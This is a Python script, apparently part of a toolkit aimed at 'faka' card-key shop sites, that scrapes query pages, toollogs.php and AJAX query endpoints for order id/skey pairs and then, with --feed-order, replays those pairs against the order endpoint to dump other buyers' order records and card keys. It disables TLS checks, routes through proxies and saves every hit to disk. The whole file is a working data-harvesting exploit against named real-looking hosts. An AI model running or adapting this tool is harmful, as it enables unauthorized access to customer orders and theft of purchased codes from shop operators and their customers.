#!/usr/bin/env python3
"""自动抓取 query/toollogs 响应，提取 showOrder/kminfo 对。

示例:
  python3 auto_capture_showorder.py qq8.one /
  python3 auto_capture_showorder.py juzi668.top /shop/ --contact QQ123 --feed-order
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

sys.path.insert(0, "/data/tools/faka")
from faka_common import DEFAULT_UA, resolve_proxy  # noqa: E402

SHOWORDER = re.compile(r"showOrder\s*\(\s*(\d+)\s*,\s*['\"]([^'\"]+)['\"]")
KMINFO = re.compile(r"kminfo|卡密", re.I)


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="Capture bodies and search showOrder/kminfo")
    ap.add_argument("host")
    ap.add_argument("path", nargs="?", default="/")
    ap.add_argument("--contact", default="")
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--out", default="")
    ap.add_argument("--pages", type=int, default=5)
    ap.add_argument("--feed-order", action="store_true")
    return ap.parse_args()


def session(proxy: str) -> requests.Session:
    s = requests.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def save_body(out: Path, name: str, text: str, meta: dict) -> dict:
    fp = out / f"{name}.body"
    fp.write_text(text, encoding="utf-8", errors="replace")
    shows = SHOWORDER.findall(text)
    rec = {
        "file": str(fp),
        "bytes": len(text),
        "showOrder": [{"id": a, "skey": b} for a, b in shows],
        "has_kminfo": bool(KMINFO.search(text)),
        **meta,
    }
    if shows or rec["has_kminfo"]:
        print(f"HIT {name}: showOrder={len(shows)} kminfo={rec['has_kminfo']}", flush=True)
    return rec


def main() -> int:
    args = parse_args()
    proxy = resolve_proxy(args.proxy)
    base_path = args.path if args.path.endswith("/") else args.path + "/"
    base = f"https://{args.host}{base_path}"
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = Path(args.out or f"/data/tools/faka/out/captures/{args.host}/{ts}")
    out.mkdir(parents=True, exist_ok=True)

    s = session(proxy)
    s.headers.update({"User-Agent": DEFAULT_UA, "Referer": base})
    report: dict = {"host": args.host, "base": base, "contact": args.contact, "captures": [], "pairs": [], "order_hits": []}

    try:
        r = s.get(base, params={"mod": "query"}, timeout=25)
        report["captures"].append(save_body(out, "query_mod_html", r.text, {"status": r.status_code}))
    except Exception as e:
        report["captures"].append({"error": "query_mod", "detail": str(e)})

    for page in range(1, args.pages + 1):
        try:
            r = s.get(base, params={"mod": "query", "page": str(page)}, timeout=20)
            report["captures"].append(save_body(out, f"query_page_{page}", r.text, {"status": r.status_code}))
        except Exception as e:
            report["captures"].append({"error": f"query_page_{page}", "detail": str(e)})

    for label, path in [("toollogs", "toollogs.php"), ("home", "")]:
        try:
            r = s.get(base + path, timeout=20)
            report["captures"].append(save_body(out, label, r.text, {"status": r.status_code}))
        except Exception as e:
            report["captures"].append({"error": label, "detail": str(e)})

    if args.contact:
        s.get(base, params={"mod": "query"}, timeout=20)
        for qtype in ("1", "2", "3"):
            try:
                r = s.post(
                    base + "ajax.php?act=query",
                    data={"type": qtype, "qq": args.contact, "page": "1"},
                    timeout=20,
                    headers={"Referer": base + "?mod=query", "X-Requested-With": "XMLHttpRequest"},
                )
                report["captures"].append(save_body(out, f"POST_query_type{qtype}", r.text, {"status": r.status_code}))
                if r.text.strip().startswith("{"):
                    j = r.json()
                    if j.get("code") == 0:
                        for item in j.get("data", []):
                            if item.get("id") and item.get("skey"):
                                report["pairs"].append({"id": item["id"], "skey": item["skey"], "source": f"ajax_query type={qtype}"})
            except Exception as e:
                report["captures"].append({"error": f"query_type{qtype}", "detail": str(e)})

    seen: set[tuple[str, str]] = set()
    for cap in report["captures"]:
        if not isinstance(cap, dict):
            continue
        for p in cap.get("showOrder", []):
            key = (str(p["id"]), str(p["skey"]))
            if key not in seen:
                seen.add(key)
                report["pairs"].append({**p, "source": cap.get("file", "")})

    (out / "skey_pairs.json").write_text(json.dumps(report["pairs"], ensure_ascii=False, indent=2), encoding="utf-8")

    if args.feed_order and report["pairs"]:
        for p in report["pairs"][:30]:
            oid, sk = p.get("id"), p.get("skey")
            try:
                r = s.post(base + "ajax.php?act=order", data={"id": str(oid), "skey": str(sk)}, timeout=15, headers={"Referer": base + "?mod=query"})
                j = r.json() if r.text.strip().startswith("{") else {"raw": r.text[:200]}
                if j.get("code") == 0:
                    dump = out / f"order_{oid}.json"
                    dump.write_text(json.dumps(j, ensure_ascii=False, indent=2), encoding="utf-8")
                    report["order_hits"].append({"id": oid, "skey": sk, "file": str(dump)})
                    print(f"ORDER OK {oid} -> {dump}", flush=True)
            except Exception as e:
                report["order_hits"].append({"id": oid, "error": str(e)})

    report_path = out / "capture_report.json"
    report_path.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps({"out": str(out), "pairs": len(report["pairs"]), "order_hits": len(report["order_hits"])}, ensure_ascii=False))
    return 0 if report["pairs"] or report["order_hits"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
